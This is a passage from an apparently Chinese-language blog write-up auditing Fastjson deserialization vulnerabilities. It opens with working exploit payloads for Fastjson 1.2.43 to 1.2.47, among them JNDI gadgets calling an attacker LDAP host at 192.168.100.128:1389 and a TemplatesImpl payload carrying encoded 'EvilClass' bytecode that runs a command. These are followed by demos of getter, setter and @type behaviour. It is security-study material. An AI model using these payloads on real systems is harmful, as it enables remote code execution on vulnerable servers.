kADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br> <br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;[org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>[&#123;,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;LLorg.apache.ibatis.datasource.jndi.JndiDataSourceFactory;;&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>FastJson  1.2.43</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br> <br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;[org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>[&#123;,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>FastJson 1.2.44</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br></code></pre></td></tr></table></figure><p>FastJson  ≤ 1.2.47</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//1.2.25-1.2.32版本：不能开启AutoType</span><br><span class="hljs-comment">//1.2.33-1.2.47版本：无论是否开启AutoType，都能成功利用</span><br><br>&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="反序列化如何调用getter"><a href="#反序列化如何调用getter" class="headerlink" title="反序列化如何调用getter"></a>反序列化如何调用getter</h2><h3 id="getter返回类型为Collection-lt-gt"><a href="#getter返回类型为Collection-lt-gt" class="headerlink" title="getter返回类型为Collection&lt;&gt;"></a>getter返回类型为<code>Collection&lt;&gt;</code></h3><p>并且没有<code>setter</code>方法，传入的payload的值是集合，通过<code>getter()</code>获取集合实例然后通过反射或集合方法填充数据，如使用<code>realms.add(realm)</code></p><h3 id="通过循环引用"><a href="#通过循环引用" class="headerlink" title="通过循环引用"></a>通过循环引用</h3><p>循环引用，fastjson默认开启</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747038184756-e43d2fcc-f7f3-45b1-92a7-ff6ba4f6aff7.png"></p><p><code>&#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;</code>是一个 <code>JSON-Path </code>引用表达式，表示访问根节点（当前 JSON 根节点下）也就是<code>CacheJndiTmLookup</code>的<code>tm</code>属性，Fastjson 会通过反射调用 <code>getTm() </code>方法（如果存在）或直接访问 <code>tm </code>字段来获取值，并且<code>getter</code>方法不能是<code>void</code>无返回值的</p><p>一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;  <span class="hljs-comment">// 类名建议大写</span><br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge() called&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;admin\&quot;,\&quot;age\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.age\&quot;&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> JSON.parseObject(payload, User.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了<code>getAge</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747039876597-773122ee-f76d-40a0-ae6e-a664e0d7baa2.png"></p><p>无论是否存在<code>setter</code>，循环引用都会调用<code>getter</code></p><p>一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;  <span class="hljs-comment">// 类名建议大写</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName call&quot;</span>);<br>        System.out.println(<span class="hljs-built_in">this</span>.name);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge() called&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">setAge</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-built_in">this</span>.age);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.name\&quot;&#125;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> JSON.parseObject(payload, User.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1747114003540-9e471015-3391-4a0b-9566-e4f1f051506e.png"></p><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><blockquote><p>Fastjson 是阿里巴巴开源的一款高性能 Java 库，主要用于 <strong>JSON 数据的解析和生成</strong>。它可以将 Java 对象转换为 JSON 字符串（序列化），也能将 JSON 字符串还原为 Java 对象（反序列化），在 Java 开发中广泛用于网络通信、数据存储和配置文件处理等场景。</p></blockquote><p>一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;&#125;  <span class="hljs-comment">//无参构造方法（必须）不然会报错</span><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;  <span class="hljs-comment">//有参构造方法</span><br>            <span class="hljs-built_in">this</span>.age = age;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br><br>        <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用 getAge()&quot;</span>);<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br><br>        <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用 setAge()&quot;</span>);<br>            <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br><br>        <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用 setName()&quot;</span>);<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br><br>        <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用 getName()&quot;</span>);<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// 序列化（会getter方法）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-number">18</span>));<br>        System.out.println(<span class="hljs-string">&quot;序列化数据  &quot;</span>+ json);<br><br>        <span class="hljs-comment">// 反序列化（会setter方法）</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> JSON.parseObject(json, User.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745592772338-7ffcd667-25d0-4b6d-9cfb-da68a49250a4.png"></p><p>fastjson在序列化的时候会自动调用类的getter方法来获取属性值，而不是直接访问属性</p><p>在反序列化时会自动调用类的setter方法来赋值，而不是直接修改字段</p><p>正是因为这个特性，在反序列化/序列化参数可控的时候，可以利用某些类来进行恶意操作。</p><p>为什么要有一个无参构造方法。</p><p><strong>Java对象实例化的基本规则</strong></p><ul><li><strong>无参构造方法是Java类的默认入口</strong><br>如果一个类没有显式定义任何构造方法，Java编译器会自动生成一个无参构造方法。但如果定义了带参数的构造方法（如 <code>User(String name)</code>），编译器<strong>不再生成默认无参构造方法</strong>。</li><li><strong>反序列化需要先创建空对象</strong><br>Fastjson在反序列化时，需要先通过无参构造方法创建一个“空壳”对象实例，再通过反射或setter方法将JSON中的字段值填充到对象中。如果没有无参构造方法，则无法完成第一步的实例化。</li></ul><p>Fastjson反序列化的核心步骤如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String json, Class&lt;T&gt; clazz)</span> &#123;<br>    <span class="hljs-comment">// 1. 通过无参构造方法创建空对象</span><br>    <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> clazz.newInstance(); <span class="hljs-comment">// 需要无参构造方法</span><br>    <br>    <span class="hljs-comment">// 2. 解析JSON字段，通过反射或setter填充对象属性</span><br>    <span class="hljs-keyword">for</span> (Field field : clazz.getFields()) &#123;<br>        field.set(obj, json中对应的值);<br>    &#125;<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>JSON字段的键值对是动态的（可能缺少某些字段或顺序混乱），无法直接匹配构造方法的参数列表。而无参构造方法提供了一种统一的实例化方式。</p><h2 id="type"><a href="#type" class="headerlink" title="@type"></a><code>@type</code></h2><blockquote><p>在 Fastjson 中，<code>@type</code> 是一个特殊的字段，用于 <strong>指定 JSON 数据反序列化时的目标 Java 类</strong>。它是 Fastjson 的 <strong>AutoType（自动类型识别）</strong> 功能的核心部分，但同时也是 Fastjson 历史上多个安全漏洞的根源。</p></blockquote><p><code>@type</code>的作用就是用完整的包名定位原始类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User1</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User1</span><span class="hljs-params">()</span>&#123;&#125;  <span class="hljs-comment">//无参构造方法（必须）</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User1</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;  <span class="hljs-comment">//有参构造方法</span><br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用1 getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用1 setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用1 setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用1 getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User2</span><span class="hljs-params">()</span>&#123;&#125;  <span class="hljs-comment">//无参构造方法（必须）</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User2</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;  <span class="hljs-comment">//有参构造方法</span><br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用2 getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用2 setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 反序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用2 setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Fastjson 序列化时会调用此方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用2 getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    